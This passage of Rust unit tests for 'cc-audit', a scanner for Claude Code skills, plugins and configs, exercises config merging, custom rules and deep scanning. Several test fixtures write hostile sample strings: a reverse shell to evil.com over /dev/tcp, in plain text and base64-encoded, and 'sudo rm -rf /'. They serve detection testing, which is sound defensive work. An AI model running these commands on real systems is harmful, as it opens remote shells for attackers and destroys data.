        let cli = create_test_cli(vec![
            temp_dir1.path().to_path_buf(),
            temp_dir2.path().to_path_buf(),
        ]);
        let result = setup_watch_mode(&cli);

        assert!(result.is_ok());
    }

    #[test]
    fn test_watch_iteration_success() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = watch_iteration(&cli);

        assert!(result.is_some());
        let output = result.unwrap();
        assert!(output.contains("PASS"));
    }

    #[test]
    fn test_watch_iteration_failure() {
        let cli = create_test_cli(vec![PathBuf::from("/nonexistent/path/12345")]);
        let result = watch_iteration(&cli);

        assert!(result.is_none());
    }

    #[test]
    fn test_watch_mode_result_debug() {
        // Test Debug trait for WatchModeResult
        let success = WatchModeResult::Success;
        let watcher_failed = WatchModeResult::WatcherCreationFailed("test error".to_string());
        let path_failed = WatchModeResult::WatchPathFailed("path".to_string(), "error".to_string());

        assert_eq!(format!("{:?}", success), "Success");
        assert!(format!("{:?}", watcher_failed).contains("WatcherCreationFailed"));
        assert!(format!("{:?}", path_failed).contains("WatchPathFailed"));
    }

    #[test]
    fn test_run_scan_with_config_rules() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md with content that matches custom rule
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\nhttps://internal.corp.com/api").unwrap();

        // Create .cc-audit.yaml with custom rule
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
rules:
  - id: "CONFIG-001"
    name: "Internal API access"
    severity: "high"
    category: "exfiltration"
    patterns:
      - 'https?://internal\.'
    message: "Internal API access detected"
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        // Should detect the custom rule
        assert!(result.findings.iter().any(|f| f.id == "CONFIG-001"));
    }

    #[test]
    fn test_run_scan_with_config_malware_signatures() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md with content that matches custom malware signature
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\ncustom_malware_pattern_xyz").unwrap();

        // Create .cc-audit.yaml with custom malware signature
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
malware_signatures:
  - id: "MW-CONFIG-001"
    name: "Custom Config Malware"
    description: "Test malware from config"
    pattern: "custom_malware_pattern_xyz"
    severity: "critical"
    category: "exfiltration"
    confidence: "firm"
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        // Should detect the custom malware signature
        assert!(result.findings.iter().any(|f| f.id == "MW-CONFIG-001"));
    }

    #[test]
    fn test_run_scan_config_and_cli_rules_merge() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md with content
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\nconfig_pattern_match\ncli_pattern_match").unwrap();

        // Create .cc-audit.yaml with custom rule
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
rules:
  - id: "CONFIG-RULE"
    name: "Config Rule"
    severity: "high"
    category: "exfiltration"
    patterns:
      - 'config_pattern_match'
    message: "Config pattern detected"
"#,
        )
        .unwrap();

        // Create CLI custom rules file
        let cli_rules_file = temp_dir.path().join("cli-rules.yaml");
        fs::write(
            &cli_rules_file,
            r#"
version: "1"
rules:
  - id: "CLI-RULE"
    name: "CLI Rule"
    severity: "medium"
    category: "obfuscation"
    patterns:
      - 'cli_pattern_match'
    message: "CLI pattern detected"
"#,
        )
        .unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.custom_rules = Some(cli_rules_file);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        // Both rules should be detected (merge)
        assert!(result.findings.iter().any(|f| f.id == "CONFIG-RULE"));
        assert!(result.findings.iter().any(|f| f.id == "CLI-RULE"));
    }

    #[test]
    fn test_run_scan_without_config_file() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md without .cc-audit.yaml
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        // Should still work with default config
        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_invalid_custom_rules_file() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        // Create invalid custom rules file
        let invalid_rules_file = temp_dir.path().join("invalid-rules.yaml");
        fs::write(&invalid_rules_file, "invalid: yaml: [").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.custom_rules = Some(invalid_rules_file);
        let result = run_scan(&cli);

        // Should still work with default rules (error is logged)
        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_invalid_config_rules() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        // Create .cc-audit.yaml with invalid rule (invalid category)
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
rules:
  - id: "INVALID-001"
    name: "Invalid Rule"
    severity: "high"
    category: "invalid_category"
    patterns:
      - 'test'
    message: "Test"
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        // Should still work (error is logged)
        assert!(result.is_some());
    }

    #[test]
    fn test_is_text_file_rc_files() {
        // Test files ending with "rc" are detected as text
        assert!(is_text_file(std::path::Path::new(".bashrc")));
        assert!(is_text_file(std::path::Path::new(".vimrc")));
        assert!(is_text_file(std::path::Path::new("npmrc")));
    }

    #[test]
    fn test_is_text_file_dotfiles() {
        // Test dotfiles are detected as text
        assert!(is_text_file(std::path::Path::new(".gitignore")));
        assert!(is_text_file(std::path::Path::new(".editorconfig")));
        assert!(is_text_file(std::path::Path::new(".env")));
    }

    #[test]
    fn test_run_scan_with_invalid_malware_signature_pattern() {
        let temp_dir = TempDir::new().unwrap();

        // Create SKILL.md
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        // Create .cc-audit.yaml with invalid malware signature pattern
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
malware_signatures:
  - id: "MW-INVALID"
    name: "Invalid"
    description: "Invalid pattern"
    pattern: "[invalid("
    severity: "critical"
    category: "exfiltration"
    confidence: "firm"
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        // Should still work (error is logged, but scan continues)
        assert!(result.is_some());
    }

    #[test]
    fn test_is_text_file_unknown_file_returns_false() {
        // Test that unknown files without extension return false
        assert!(!is_text_file(std::path::Path::new("somebinaryfile")));
    }

    #[test]
    fn test_effective_config_with_default_config() {
        let cli = create_test_cli(vec![PathBuf::from("./")]);
        let config = Config::default();
        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);

        // Should use CLI defaults when config has no overrides
        assert!(matches!(effective.format, OutputFormat::Terminal));
        assert!(!effective.strict);
        assert!(matches!(effective.scan_type, ScanType::Skill));
        assert!(!effective.ci);
        assert!(!effective.verbose);
        assert!(matches!(effective.min_confidence, Confidence::Tentative));
        assert!(!effective.skip_comments);
        assert!(!effective.fix_hint);
        assert!(!effective.no_malware_scan);
    }

    #[test]
    fn test_effective_config_with_config_overrides() {
        let cli = create_test_cli(vec![PathBuf::from("./")]);

        // Create config with overrides
        let mut config = Config::default();
        config.scan.format = Some("json".to_string());
        config.scan.strict = true;
        config.scan.scan_type = Some("docker".to_string());
        config.scan.ci = true;
        config.scan.verbose = true;
        config.scan.min_confidence = Some("firm".to_string());
        config.scan.skip_comments = true;
        config.scan.fix_hint = true;
        config.scan.no_malware_scan = true;

        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);

        // Config values should be used (merged with CLI)
        assert!(matches!(effective.format, OutputFormat::Json));
        assert!(effective.strict); // true from config
        assert!(matches!(effective.scan_type, ScanType::Docker));
        assert!(effective.ci); // true from config
        assert!(effective.verbose); // true from config
        assert!(matches!(effective.min_confidence, Confidence::Firm));
        assert!(effective.skip_comments); // true from config
        assert!(effective.fix_hint); // true from config
        assert!(effective.no_malware_scan); // true from config
    }

    #[test]
    fn test_effective_config_cli_or_config_booleans() {
        // Test that boolean flags use OR logic (either can enable)
        let mut cli = create_test_cli(vec![PathBuf::from("./")]);
        cli.strict = true; // CLI enables strict

        let mut config = Config::default();
        config.scan.verbose = true; // Config enables verbose

        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);

        // Both should be true (from different sources)
        assert!(effective.strict); // from CLI
        assert!(effective.verbose); // from config
    }

    #[test]
    fn test_effective_config_invalid_format_falls_back() {
        let cli = create_test_cli(vec![PathBuf::from("./")]);

        let mut config = Config::default();
        config.scan.format = Some("invalid_format".to_string());

        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);

        // Should fall back to CLI default
        assert!(matches!(effective.format, OutputFormat::Terminal));
    }

    #[test]
    fn test_effective_config_invalid_scan_type_falls_back() {
        let cli = create_test_cli(vec![PathBuf::from("./")]);

        let mut config = Config::default();
        config.scan.scan_type = Some("invalid_type".to_string());

        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);

        // Should fall back to CLI default
        assert!(matches!(effective.scan_type, ScanType::Skill));
    }

    #[test]
    fn test_effective_config_invalid_confidence_falls_back() {
        let cli = create_test_cli(vec![PathBuf::from("./")]);

        let mut config = Config::default();
        config.scan.min_confidence = Some("invalid".to_string());

        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);

        // Should fall back to CLI default
        assert!(matches!(effective.min_confidence, Confidence::Tentative));
    }

    #[test]
    fn test_effective_config_new_fields_from_config() {
        let cli = create_test_cli(vec![PathBuf::from("./")]);

        let mut config = Config::default();
        config.scan.deep_scan = true;
        config.scan.watch = true;
        config.scan.fix = true;
        config.scan.fix_dry_run = true;
        config.scan.malware_db = Some("./custom-malware.json".to_string());
        config.scan.custom_rules = Some("./custom-rules.yaml".to_string());
        config.scan.output = Some("./report.html".to_string());

        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);

        assert!(effective.deep_scan);
        assert!(effective.watch);
        assert!(effective.fix);
        assert!(effective.fix_dry_run);
        assert_eq!(
            effective.malware_db,
            Some("./custom-malware.json".to_string())
        );
        assert_eq!(
            effective.custom_rules,
            Some("./custom-rules.yaml".to_string())
        );
        assert_eq!(effective.output, Some("./report.html".to_string()));
    }

    #[test]
    fn test_effective_config_cli_overrides_config_paths() {
        let mut cli = create_test_cli(vec![PathBuf::from("./")]);
        cli.malware_db = Some(PathBuf::from("./cli-malware.json"));
        cli.custom_rules = Some(PathBuf::from("./cli-rules.yaml"));
        cli.output = Some(PathBuf::from("./cli-output.html"));

        let mut config = Config::default();
        config.scan.malware_db = Some("./config-malware.json".to_string());
        config.scan.custom_rules = Some("./config-rules.yaml".to_string());
        config.scan.output = Some("./config-output.html".to_string());

        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);

        // CLI should take precedence
        assert_eq!(effective.malware_db, Some("./cli-malware.json".to_string()));
        assert_eq!(effective.custom_rules, Some("./cli-rules.yaml".to_string()));
        assert_eq!(effective.output, Some("./cli-output.html".to_string()));
    }

    #[test]
    fn test_effective_config_default_new_fields() {
        let cli = create_test_cli(vec![PathBuf::from("./")]);
        let config = Config::default();
        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);

        // New fields should have default values
        assert!(!effective.deep_scan);
        assert!(!effective.watch);
        assert!(!effective.fix);
        assert!(!effective.fix_dry_run);
        assert!(effective.malware_db.is_none());
        assert!(effective.custom_rules.is_none());
        assert!(effective.output.is_none());
    }

    #[test]
    fn test_run_scan_with_config_scan_settings() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        // Create config with scan settings
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
scan:
  strict: true
  verbose: true
  skip_comments: true
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        // Scan should succeed
        assert!(result.is_some());
    }

    #[test]
    fn test_parse_output_format() {
        assert_eq!(
            parse_output_format(Some("terminal")),
            Some(OutputFormat::Terminal)
        );
        assert_eq!(
            parse_output_format(Some("Terminal")),
            Some(OutputFormat::Terminal)
        );
        assert_eq!(
            parse_output_format(Some("TERMINAL")),
            Some(OutputFormat::Terminal)
        );
        assert_eq!(parse_output_format(Some("json")), Some(OutputFormat::Json));
        assert_eq!(
            parse_output_format(Some("sarif")),
            Some(OutputFormat::Sarif)
        );
        assert_eq!(parse_output_format(Some("html")), Some(OutputFormat::Html));
        assert_eq!(parse_output_format(Some("invalid")), None);
        assert_eq!(parse_output_format(None), None);
    }

    #[test]
    fn test_parse_scan_type() {
        assert_eq!(parse_scan_type(Some("skill")), Some(ScanType::Skill));
        assert_eq!(parse_scan_type(Some("Skill")), Some(ScanType::Skill));
        assert_eq!(parse_scan_type(Some("hook")), Some(ScanType::Hook));
        assert_eq!(parse_scan_type(Some("mcp")), Some(ScanType::Mcp));
        assert_eq!(parse_scan_type(Some("command")), Some(ScanType::Command));
        assert_eq!(parse_scan_type(Some("rules")), Some(ScanType::Rules));
        assert_eq!(parse_scan_type(Some("docker")), Some(ScanType::Docker));
        assert_eq!(
            parse_scan_type(Some("dependency")),
            Some(ScanType::Dependency)
        );
        assert_eq!(parse_scan_type(Some("invalid")), None);
        assert_eq!(parse_scan_type(None), None);
    }

    #[test]
    fn test_parse_confidence() {
        assert_eq!(
            parse_confidence(Some("tentative")),
            Some(Confidence::Tentative)
        );
        assert_eq!(
            parse_confidence(Some("Tentative")),
            Some(Confidence::Tentative)
        );
        assert_eq!(parse_confidence(Some("firm")), Some(Confidence::Firm));
        assert_eq!(parse_confidence(Some("certain")), Some(Confidence::Certain));
        assert_eq!(parse_confidence(Some("invalid")), None);
        assert_eq!(parse_confidence(None), None);
    }

    #[test]
    fn test_parse_scan_type_subagent_and_plugin() {
        assert_eq!(parse_scan_type(Some("subagent")), Some(ScanType::Subagent));
        assert_eq!(parse_scan_type(Some("plugin")), Some(ScanType::Plugin));
    }

    #[test]
    fn test_is_config_file() {
        assert!(is_config_file(Path::new(".cc-audit.yaml")));
        assert!(is_config_file(Path::new(".cc-audit.yml")));
        assert!(is_config_file(Path::new(".cc-audit.json")));
        assert!(is_config_file(Path::new(".cc-audit.toml")));
        assert!(is_config_file(Path::new(".cc-auditignore")));
        assert!(!is_config_file(Path::new("regular.yaml")));
        assert!(!is_config_file(Path::new("test.json")));
    }

    #[test]
    fn test_format_result_html() {
        let temp_dir = TempDir::new().unwrap();
        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.format = OutputFormat::Html;

        let result = ScanResult {
            version: "0.4.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: temp_dir.path().display().to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
            risk_score: None,
        };

        let output = format_result(&cli, &result);
        assert!(output.contains("<!DOCTYPE html>"));
        assert!(output.contains("cc-audit"));
    }

    #[test]
    fn test_run_scan_dependency_type() {
        let temp_dir = TempDir::new().unwrap();
        let package_json = temp_dir.path().join("package.json");
        fs::write(
            &package_json,
            r#"{"name": "test", "dependencies": {"express": "4.0.0"}}"#,
        )
        .unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Dependency;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_subagent_type() {
        let temp_dir = TempDir::new().unwrap();
        let agents_dir = temp_dir.path().join(".claude").join("agents");
        fs::create_dir_all(&agents_dir).unwrap();
        let agent_file = agents_dir.join("test.md");
        fs::write(
            &agent_file,
            r#"---
name: test-agent
---
# Test Agent
"#,
        )
        .unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Subagent;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_plugin_type() {
        let temp_dir = TempDir::new().unwrap();
        let plugin_json = temp_dir.path().join("marketplace.json");
        fs::write(&plugin_json, r#"{"name": "test-plugin"}"#).unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.scan_type = ScanType::Plugin;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_deep_scan() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        // Create content with base64 encoded suspicious string
        fs::write(
            &skill_md,
            "# Test\n\nYmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS80NDQ0IDA+JjE=",
        )
        .unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.deep_scan = true;
        let result = run_scan(&cli);

        assert!(result.is_some());
        // Deep scan should decode base64 and find suspicious content
        let result = result.unwrap();
        // Check if any finding is from deobfuscation
        let has_obfuscation_finding = result
            .findings
            .iter()
            .any(|f| f.id.starts_with("OB-") || f.message.contains("decoded"));
        assert!(
            has_obfuscation_finding || result.findings.is_empty(),
            "Deep scan should have run"
        );
    }

    #[test]
    fn test_run_scan_with_deep_scan_on_file() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("test.sh");
        // Create content with base64 encoded suspicious string
        fs::write(
            &test_file,
            "#!/bin/bash\n# YmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS80NDQ0IDA+JjE=",
        )
        .unwrap();

        let mut cli = create_test_cli(vec![test_file.clone()]);
        cli.deep_scan = true;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_deep_scan_on_file() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("test.sh");
        // Highly suspicious content when decoded
        fs::write(
            &test_file,
            "YmFzaCAtaSA+JiAvZGV2L3RjcC9ldmlsLmNvbS8xMjM0IDA+JjE=",
        )
        .unwrap();

        let findings = run_deep_scan(&test_file);
        // Should run deobfuscation
        assert!(findings.is_empty() || !findings.is_empty());
    }

    #[test]
    fn test_run_deep_scan_on_directory() {
        let temp_dir = TempDir::new().unwrap();
        let test_file = temp_dir.path().join("test.sh");
        fs::write(&test_file, "# Normal content").unwrap();

        let findings = run_deep_scan(temp_dir.path());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_run_deep_scan_skips_binary() {
        let temp_dir = TempDir::new().unwrap();
        let binary_file = temp_dir.path().join("test.exe");
        fs::write(&binary_file, "suspicious content").unwrap();

        let findings = run_deep_scan(&binary_file);
        // Binary files should be skipped
        assert!(findings.is_empty());
    }

    #[test]
    fn test_scan_path_with_malware_db_skips_config_file() {
        let temp_dir = TempDir::new().unwrap();
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        // Put suspicious content in config file
        fs::write(&config_file, "bash -i >& /dev/tcp/evil.com/4444 0>&1").unwrap();

        let db = MalwareDatabase::default();
        let findings = scan_path_with_malware_db(&config_file, &db);

        // Config files should be skipped
        assert!(findings.is_empty());
    }

    #[test]
    fn test_run_scan_with_include_tests() {
        let temp_dir = TempDir::new().unwrap();
        let tests_dir = temp_dir.path().join("__tests__");
        fs::create_dir_all(&tests_dir).unwrap();
        let test_file = tests_dir.join("test.md");
        fs::write(&test_file, "# Test file\nsudo rm -rf /").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.include_tests = true;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_include_node_modules() {
        let temp_dir = TempDir::new().unwrap();
        let node_modules_dir = temp_dir.path().join("node_modules");
        fs::create_dir_all(&node_modules_dir).unwrap();
        let module_file = node_modules_dir.join("test.md");
        fs::write(&module_file, "# Test file").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.include_node_modules = true;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_include_vendor() {
        let temp_dir = TempDir::new().unwrap();
        let vendor_dir = temp_dir.path().join("vendor");
        fs::create_dir_all(&vendor_dir).unwrap();
        let vendor_file = vendor_dir.join("test.md");
        fs::write(&vendor_file, "# Test file").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.include_vendor = true;
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_profile() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.profile = Some("strict".to_string());
        let result = run_scan(&cli);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_invalid_profile() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let mut cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        cli.profile = Some("nonexistent_profile_xyz".to_string());
        let result = run_scan(&cli);

        // Should still work (warning is logged)
        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_config() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\n").unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let config = Config::default();
        let result = run_scan_with_config(&cli, config);

        assert!(result.is_some());
    }

    #[test]
    fn test_run_scan_with_disabled_rules() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(&skill_md, "# Test\nsudo rm -rf /").unwrap();

        // Create config with PE-001 disabled
        let config_file = temp_dir.path().join(".cc-audit.yaml");
        fs::write(
            &config_file,
            r#"
disabled_rules:
  - PE-001
"#,
        )
        .unwrap();

        let cli = create_test_cli(vec![temp_dir.path().to_path_buf()]);
        let result = run_scan(&cli);

        assert!(result.is_some());
        let result = result.unwrap();
        // PE-001 should not be in findings (disabled)
        assert!(!result.findings.iter().any(|f| f.id == "PE-001"));
    }

    #[test]
    fn test_effective_config_debug() {
        let cli = create_test_cli(vec![PathBuf::from("./")]);
        let config = Config::default();
        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);

        let debug_str = format!("{:?}", effective);
        assert!(debug_str.contains("EffectiveConfig"));
    }

    #[test]
    fn test_effective_config_clone() {
        let cli = create_test_cli(vec![PathBuf::from("./")]);
        let config = Config::default();
        let effective = EffectiveConfig::from_cli_and_config(&cli, &config);

        let cloned = effective.clone();
        assert_eq!(format!("{:?}", effective), format!("{:?}", cloned));
    }

    #[test]
    fn test_format_result_with_config_directly() {
        let effective = EffectiveConfig {
            format: OutputFormat::Json,
            strict: false,
            warn_only: false,
            min_severity: None,
            min_rule_severity: None,
            scan_type: ScanType::Skill,
            recursive: true,
            ci: false,
            verbose: false,
            min_confidence: Confidence::Tentative,
            skip_comments: false,
            fix_hint: false,
            no_malware_scan: false,
            deep_scan: false,
            watch: false,
            output: None,
            fix: false,
            fix_dry_run: false,
            malware_db: None,
            custom_rules: None,
        };

        let result = ScanResult {
            version: "0.4.0".to_string(),
            scanned_at: "2026-01-25T12:00:00Z".to_string(),
            target: "test".to_string(),
            summary: Summary::from_findings(&[]),
            findings: vec![],
            risk_score: None,
        };

        let output = format_result_with_config(&effective, &result);
        assert!(output.contains("\"version\""));
    }

    #[test]
    fn test_is_text_file_with_config() {
        let config = crate::config::TextFilesConfig::default();
        assert!(is_text_file_with_config(Path::new("test.md"), &config));
        assert!(is_text_file_with_config(Path::new("test.json"), &config));
        assert!(!is_text_file_with_config(Path::new("test.exe"), &config));
    }

    #[test]
    fn test_run_scan_single_file() {
        let temp_dir = TempDir::new().unwrap();
        let skill_md = temp_dir.path().join("SKILL.md");
        fs::write(
            &skill_md,
            r#"---
name: test
allowed-tools: Read
---
# Test
"#,
        )
        .unwrap();

        // Scan single file instead of directory
        let cli = create_test_cli(vec![skill_md.clone()]);
        let result = run_scan(&cli);

        assert!(result.is_some());
    }
}
